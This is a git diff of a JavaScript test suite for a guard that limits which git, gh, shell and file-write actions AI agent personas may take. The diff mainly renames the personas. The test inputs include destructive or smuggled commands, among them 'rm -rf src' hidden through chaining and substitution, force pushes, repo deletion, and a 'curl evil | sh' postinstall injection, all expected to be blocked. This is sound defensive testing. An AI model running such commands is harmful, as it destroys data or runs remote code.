@@ -244,37 +244,37 @@ try {
     };
   }
   function orchestratorBlocks(command) {
-    return evaluateToolGuard('readonly', personaCtx('orchestrator', command)).block === true;
+    return evaluateToolGuard('readonly', personaCtx('palm', command)).block === true;
   }
 
-  check('orchestrator git fetch allowed', orchestratorBlocks('git fetch origin --prune') === false);
-  check('orchestrator git rebase origin/main allowed', orchestratorBlocks('git rebase origin/main') === false);
-  check('orchestrator git push branch allowed', orchestratorBlocks('git push -u origin chore/guard-shared-module') === false);
-  check('orchestrator git push force-with-lease allowed', orchestratorBlocks('git push origin HEAD --force-with-lease') === false);
-  check('orchestrator gh pr create allowed', orchestratorBlocks('gh pr create --title x --body y') === false);
-  check('orchestrator gh pr edit allowed', orchestratorBlocks('gh pr edit 55 --body z') === false);
+  check('palm git fetch allowed', orchestratorBlocks('git fetch origin --prune') === false);
+  check('palm git rebase origin/main allowed', orchestratorBlocks('git rebase origin/main') === false);
+  check('palm git push branch allowed', orchestratorBlocks('git push -u origin chore/guard-shared-module') === false);
+  check('palm git push force-with-lease allowed', orchestratorBlocks('git push origin HEAD --force-with-lease') === false);
+  check('palm gh pr create allowed', orchestratorBlocks('gh pr create --title x --body y') === false);
+  check('palm gh pr edit allowed', orchestratorBlocks('gh pr edit 55 --body z') === false);
 
-  check('orchestrator git add allowed', orchestratorBlocks('git add -A') === false);
-  check('orchestrator git add manifest allowed', orchestratorBlocks('git add package.json package-lock.json') === false);
-  check('orchestrator git add -p blocked', orchestratorBlocks('git add -p') === true);
-  check('orchestrator git commit -m allowed', orchestratorBlocks('git commit -m "chore(release): 1.3.4"') === false);
-  check('orchestrator git commit -F allowed', orchestratorBlocks('git commit -F msg.txt') === false);
-  check('orchestrator git commit without message blocked', orchestratorBlocks('git commit') === true);
-  check('orchestrator git commit --amend blocked', orchestratorBlocks('git commit --amend -m x') === true);
-  check('orchestrator git commit --no-verify blocked', orchestratorBlocks('git commit --no-verify -m x') === true);
-  check('orchestrator git tag allowed', orchestratorBlocks('git tag v1.3.4') === false);
-  check('orchestrator annotated tag with message allowed', orchestratorBlocks('git tag -a v1.3.4 -m "v1.3.4"') === false);
-  check('orchestrator annotated tag without message blocked', orchestratorBlocks('git tag -a v1.3.4') === true);
-  check('orchestrator git tag -d blocked', orchestratorBlocks('git tag -d v1.3.4') === true);
-  check('orchestrator git tag -f blocked', orchestratorBlocks('git tag -f v1.3.4') === true);
-  check('orchestrator git tag -e blocked', orchestratorBlocks('git tag -e v1.3.4') === true);
-  check('orchestrator git tag list allowed', orchestratorBlocks('git tag -l') === false);
-  check('orchestrator push tag refspec allowed', orchestratorBlocks('git push origin refs/tags/v1.3.4') === false);
-  check('orchestrator gh release create allowed', orchestratorBlocks('gh release create v1.3.4 --notes-file notes.md') === false);
-  check('orchestrator gh release edit allowed', orchestratorBlocks('gh release edit v1.3.4 --notes-file notes.md') === false);
-  check('orchestrator npm version blocked', orchestratorBlocks('npm version patch') === true);
-  check('orchestrator commit chain blocked', orchestratorBlocks('git commit -m x && rm -rf src') === true);
-  check('orchestrator commit substitution blocked', orchestratorBlocks('git commit -m "$(rm -rf src)"') === true);
+  check('palm git add allowed', orchestratorBlocks('git add -A') === false);
+  check('palm git add manifest allowed', orchestratorBlocks('git add package.json package-lock.json') === false);
+  check('palm git add -p blocked', orchestratorBlocks('git add -p') === true);
+  check('palm git commit -m allowed', orchestratorBlocks('git commit -m "chore(release): 1.3.4"') === false);
+  check('palm git commit -F allowed', orchestratorBlocks('git commit -F msg.txt') === false);
+  check('palm git commit without message blocked', orchestratorBlocks('git commit') === true);
+  check('palm git commit --amend blocked', orchestratorBlocks('git commit --amend -m x') === true);
+  check('palm git commit --no-verify blocked', orchestratorBlocks('git commit --no-verify -m x') === true);
+  check('palm git tag allowed', orchestratorBlocks('git tag v1.3.4') === false);
+  check('palm annotated tag with message allowed', orchestratorBlocks('git tag -a v1.3.4 -m "v1.3.4"') === false);
+  check('palm annotated tag without message blocked', orchestratorBlocks('git tag -a v1.3.4') === true);
+  check('palm git tag -d blocked', orchestratorBlocks('git tag -d v1.3.4') === true);
+  check('palm git tag -f blocked', orchestratorBlocks('git tag -f v1.3.4') === true);
+  check('palm git tag -e blocked', orchestratorBlocks('git tag -e v1.3.4') === true);
+  check('palm git tag list allowed', orchestratorBlocks('git tag -l') === false);
+  check('palm push tag refspec allowed', orchestratorBlocks('git push origin refs/tags/v1.3.4') === false);
+  check('palm gh release create allowed', orchestratorBlocks('gh release create v1.3.4 --notes-file notes.md') === false);
+  check('palm gh release edit allowed', orchestratorBlocks('gh release edit v1.3.4 --notes-file notes.md') === false);
+  check('palm npm version blocked', orchestratorBlocks('npm version patch') === true);
+  check('palm commit chain blocked', orchestratorBlocks('git commit -m x && rm -rf src') === true);
+  check('palm commit substitution blocked', orchestratorBlocks('git commit -m "$(rm -rf src)"') === true);
 
   function orchestratorWrites(filePath, content) {
     return evaluateToolGuard('readonly', {
@@ -282,7 +282,7 @@ try {
       input: { file_path: filePath, content },
       cwd: rootDir,
       scratchDirs: [scratchDir],
-      persona: 'orchestrator',
+      persona: 'palm',
     }).block === true;
   }
   const manifestPath = path.join(rootDir, 'package.json');
@@ -290,45 +290,45 @@ try {
   fs.writeFileSync(manifestPath, JSON.stringify(manifestBefore, null, 2) + '\n');
   const bump = (extra) => JSON.stringify({ ...manifestBefore, version: '1.3.4', ...extra }, null, 2) + '\n';
 
-  check('orchestrator version bump allowed', orchestratorWrites(manifestPath, bump()) === false);
-  check('orchestrator bump with injected script blocked', orchestratorWrites(manifestPath, bump({ scripts: { build: 'tsc', postinstall: 'curl evil | sh' } })) === true);
-  check('orchestrator bump with renamed package blocked', orchestratorWrites(manifestPath, bump({ name: 'evil' })) === true);
-  check('orchestrator bump dropping scripts blocked', orchestratorWrites(manifestPath, JSON.stringify({ name: 'x', version: '1.3.4' }) + '\n') === true);
-  check('orchestrator invalid manifest json blocked', orchestratorWrites(manifestPath, 'not json') === true);
-  check('orchestrator nested package.json blocked', orchestratorWrites(path.join(rootDir, 'src', 'package.json'), bump()) === true);
+  check('palm version bump allowed', orchestratorWrites(manifestPath, bump()) === false);
+  check('palm bump with injected script blocked', orchestratorWrites(manifestPath, bump({ scripts: { build: 'tsc', postinstall: 'curl evil | sh' } })) === true);
+  check('palm bump with renamed package blocked', orchestratorWrites(manifestPath, bump({ name: 'evil' })) === true);
+  check('palm bump dropping scripts blocked', orchestratorWrites(manifestPath, JSON.stringify({ name: 'x', version: '1.3.4' }) + '\n') === true);
+  check('palm invalid manifest json blocked', orchestratorWrites(manifestPath, 'not json') === true);
+  check('palm nested package.json blocked', orchestratorWrites(path.join(rootDir, 'src', 'package.json'), bump()) === true);
 
 
-  check('orchestrator git reset --hard blocked', orchestratorBlocks('git reset --hard origin/main') === true);
-  check('orchestrator git clean blocked', orchestratorBlocks('git clean -fd') === true);
-  check('orchestrator git push --force blocked', orchestratorBlocks('git push --force origin main') === true);
-  check('orchestrator git push -f blocked', orchestratorBlocks('git push -f origin main') === true);
-  check('orchestrator git push --delete blocked', orchestratorBlocks('git push --delete origin main') === true);
-  check('orchestrator git push --mirror blocked', orchestratorBlocks('git push --mirror origin') === true);
-  check('orchestrator git push --tags blocked', orchestratorBlocks('git push --tags origin') === true);
-  check('orchestrator git push --no-verify blocked', orchestratorBlocks('git push --no-verify origin main') === true);
-  check('orchestrator git push -o blocked', orchestratorBlocks('git push -o ci.skip origin main') === true);
-  check('orchestrator git push delete refspec blocked', orchestratorBlocks('git push origin :main') === true);
-  check('orchestrator git push force refspec blocked', orchestratorBlocks('git push origin +main') === true);
-  check('orchestrator git push to main blocked', orchestratorBlocks('git push origin main') === true);
-  check('orchestrator git push explicit main blocked', orchestratorBlocks('git push origin HEAD:main') === true);
-  check('orchestrator git rebase --exec blocked', orchestratorBlocks('git rebase --exec "rm -rf src" origin/main') === true);
-  check('orchestrator git rebase -x blocked', orchestratorBlocks('git rebase -x "rm -rf src" origin/main') === true);
-  check('orchestrator gh pr merge blocked', orchestratorBlocks('gh pr merge 55') === true);
-  check('orchestrator gh pr close blocked', orchestratorBlocks('gh pr close 55') === true);
-  check('orchestrator gh repo delete blocked', orchestratorBlocks('gh repo delete agirahman/righthand') === true);
-  check('orchestrator shell mutation blocked', orchestratorBlocks('rm -rf src') === true);
-  check('orchestrator chained mutation blocked', orchestratorBlocks('git push origin main && rm -rf src') === true);
-  check('orchestrator chained destructive commit blocked', orchestratorBlocks('git push origin main; git reset --hard origin/main') === true);
-  check('orchestrator chained mutation after tag blocked', orchestratorBlocks('git tag v1.3.4; rm -rf src') === true);
-  check('orchestrator substitution mutation blocked', orchestratorBlocks('git push $(rm -rf src)') === true);
+  check('palm git reset --hard blocked', orchestratorBlocks('git reset --hard origin/main') === true);
+  check('palm git clean blocked', orchestratorBlocks('git clean -fd') === true);
+  check('palm git push --force blocked', orchestratorBlocks('git push --force origin main') === true);
+  check('palm git push -f blocked', orchestratorBlocks('git push -f origin main') === true);
+  check('palm git push --delete blocked', orchestratorBlocks('git push --delete origin main') === true);
+  check('palm git push --mirror blocked', orchestratorBlocks('git push --mirror origin') === true);
+  check('palm git push --tags blocked', orchestratorBlocks('git push --tags origin') === true);
+  check('palm git push --no-verify blocked', orchestratorBlocks('git push --no-verify origin main') === true);
+  check('palm git push -o blocked', orchestratorBlocks('git push -o ci.skip origin main') === true);
+  check('palm git push delete refspec blocked', orchestratorBlocks('git push origin :main') === true);
+  check('palm git push force refspec blocked', orchestratorBlocks('git push origin +main') === true);
+  check('palm git push to main blocked', orchestratorBlocks('git push origin main') === true);
+  check('palm git push explicit main blocked', orchestratorBlocks('git push origin HEAD:main') === true);
+  check('palm git rebase --exec blocked', orchestratorBlocks('git rebase --exec "rm -rf src" origin/main') === true);
+  check('palm git rebase -x blocked', orchestratorBlocks('git rebase -x "rm -rf src" origin/main') === true);
+  check('palm gh pr merge blocked', orchestratorBlocks('gh pr merge 55') === true);
+  check('palm gh pr close blocked', orchestratorBlocks('gh pr close 55') === true);
+  check('palm gh repo delete blocked', orchestratorBlocks('gh repo delete agirahman/righthand') === true);
+  check('palm shell mutation blocked', orchestratorBlocks('rm -rf src') === true);
+  check('palm chained mutation blocked', orchestratorBlocks('git push origin main && rm -rf src') === true);
+  check('palm chained destructive commit blocked', orchestratorBlocks('git push origin main; git reset --hard origin/main') === true);
+  check('palm chained mutation after tag blocked', orchestratorBlocks('git tag v1.3.4; rm -rf src') === true);
+  check('palm substitution mutation blocked', orchestratorBlocks('git push $(rm -rf src)') === true);
 
-  check('code-reviewer git push blocked', evaluateToolGuard('readonly', personaCtx('code-reviewer', 'git push -u origin x')).block === true);
-  check('code-reviewer git fetch blocked', evaluateToolGuard('readonly', personaCtx('code-reviewer', 'git fetch origin')).block === true);
-  check('code-reviewer gh pr edit blocked', evaluateToolGuard('readonly', personaCtx('code-reviewer', 'gh pr edit 55 --body z')).block === true);
-  check('architect git rebase blocked', evaluateToolGuard('readonly', personaCtx('architect', 'git rebase origin/main')).block === true);
+  check('middle git push blocked', evaluateToolGuard('readonly', personaCtx('middle', 'git push -u origin x')).block === true);
+  check('middle git fetch blocked', evaluateToolGuard('readonly', personaCtx('middle', 'git fetch origin')).block === true);
+  check('middle gh pr edit blocked', evaluateToolGuard('readonly', personaCtx('middle', 'gh pr edit 55 --body z')).block === true);
+  check('index git rebase blocked', evaluateToolGuard('readonly', personaCtx('index', 'git rebase origin/main')).block === true);
   check('no persona git push blocked', evaluateToolGuard('readonly', { toolName: 'powershell', input: { command: 'git push -u origin x' }, cwd: rootDir, scratchDirs: [scratchDir] }).block === true);
 
-  const guardReason = (toolName, input, persona = 'orchestrator') => evaluateToolGuard('readonly', {
+  const guardReason = (toolName, input, persona = 'palm') => evaluateToolGuard('readonly', {
     toolName,
     input,
     cwd: rootDir,
@@ -336,22 +336,22 @@ try {
     persona,
   });
   const orchestratorNode = (command) => guardReason('powershell', { command });
-  check('orchestrator repo node script allowed', orchestratorNode(`node ${path.join(rootDir, 'test', 'validate-board.cjs')}`).block === false);
-  check('orchestrator repo node script with flags allowed', orchestratorNode(`node --enable-source-maps ${path.join(rootDir, 'test', 'x.cjs')}`).block === false);
-  check('orchestrator node eval blocked', orchestratorNode('node -e "1+1"').block === true);
-  check('orchestrator node outside root blocked', orchestratorNode(`node ${path.join(base, 'outside.js')}`).block === true);
-  check('orchestrator node traversal blocked', orchestratorNode(`node ${rootDir}${path.sep}..${path.sep}escape.js`).block === true);
-  check('orchestrator python inline blocked', orchestratorNode('python -c "print(1)"').block === true);
-  check('orchestrator bash inline blocked', orchestratorNode('bash -c "echo hi"').block === true);
-  check('code-reviewer repo node script blocked', guardReason('powershell', { command: `node ${path.join(rootDir, 'test', 'x.cjs')}` }, 'code-reviewer').block === true);
-  check('code-reviewer scratch node script allowed', guardReason('powershell', { command: `node ${path.join(scratchDir, 'probe.js')}` }, 'code-reviewer').block === false);
+  check('palm repo node script allowed', orchestratorNode(`node ${path.join(rootDir, 'test', 'validate-board.cjs')}`).block === false);
+  check('palm repo node script with flags allowed', orchestratorNode(`node --enable-source-maps ${path.join(rootDir, 'test', 'x.cjs')}`).block === false);
+  check('palm node eval blocked', orchestratorNode('node -e "1+1"').block === true);
+  check('palm node outside root blocked', orchestratorNode(`node ${path.join(base, 'outside.js')}`).block === true);
+  check('palm node traversal blocked', orchestratorNode(`node ${rootDir}${path.sep}..${path.sep}escape.js`).block === true);
+  check('palm python inline blocked', orchestratorNode('python -c "print(1)"').block === true);
+  check('palm bash inline blocked', orchestratorNode('bash -c "echo hi"').block === true);
+  check('middle repo node script blocked', guardReason('powershell', { command: `node ${path.join(rootDir, 'test', 'x.cjs')}` }, 'middle').block === true);
+  check('middle scratch node script allowed', guardReason('powershell', { command: `node ${path.join(scratchDir, 'probe.js')}` }, 'middle').block === false);
   const npmPack = orchestratorNode('npm pack');
-  check('orchestrator npm pack blocked with package rule reason', npmPack.block === true && /package manager|npm run/i.test(npmPack.reason || ''));
+  check('palm npm pack blocked with package rule reason', npmPack.block === true && /package manager|npm run/i.test(npmPack.reason || ''));
   const gitBranchDelete = orchestratorNode('git branch -D x');
-  check('orchestrator git branch delete blocked with git rule reason', gitBranchDelete.block === true && /git|read-only/i.test(gitBranchDelete.reason || ''));
+  check('palm git branch delete blocked with git rule reason', gitBranchDelete.block === true && /git|read-only/i.test(gitBranchDelete.reason || ''));
   const nodeEval = orchestratorNode('node -e "1+1"');
-  check('orchestrator node eval reason names inline evaluation', nodeEval.block === true && /inline evaluation/i.test(nodeEval.reason || ''));
-  const readonlyWrite = guardReason('write_file', { file_path: path.join(rootDir, 'src', 'x.js') }, 'code-reviewer');
+  check('palm node eval reason names inline evaluation', nodeEval.block === true && /inline evaluation/i.test(nodeEval.reason || ''));
+  const readonlyWrite = guardReason('write_file', { file_path: path.join(rootDir, 'src', 'x.js') }, 'middle');
   check('readonly write reason names allowed roots', readonlyWrite.block === true && /\.righthand\//i.test(readonlyWrite.reason || '') && /scratchpad/i.test(readonlyWrite.reason || ''));
   const releasePatch = guardReason('edit_file', { file_path: manifestPath, old_string: 'x', new_string: 'y' });
   check('release manifest patch reason names whole-write rule', releasePatch.block === true && /whole|patched|fragment/i.test(releasePatch.reason || ''));
@@ -375,10 +375,10 @@ try {
     ['git commit', /message/i],
   ].map(([command, pattern]) => [command, pattern, orchestratorNode(command)]);
   for (const [command, pattern, decision] of reasonCases) {
-    check(`orchestrator ${command} reason names the refusing rule`, decision.block === true && pattern.test(decision.reason || ''));
-    check(`orchestrator ${command} reason avoids generic mutation rule`, !/mutation rule/i.test(decision.reason || ''));
+    check(`palm ${command} reason names the refusing rule`, decision.block === true && pattern.test(decision.reason || ''));
+    check(`palm ${command} reason avoids generic mutation rule`, !/mutation rule/i.test(decision.reason || ''));
   }
-  check('orchestrator rm inside .righthand remains allowed', orchestratorNode('rm -rf .righthand/tickets/T1').block === false);
+  check('palm rm inside .righthand remains allowed', orchestratorNode('rm -rf .righthand/tickets/T1').block === false);
 
   if (failed > 0) {
     console.error(`\nValidation FAILED with ${failed} errors.`);
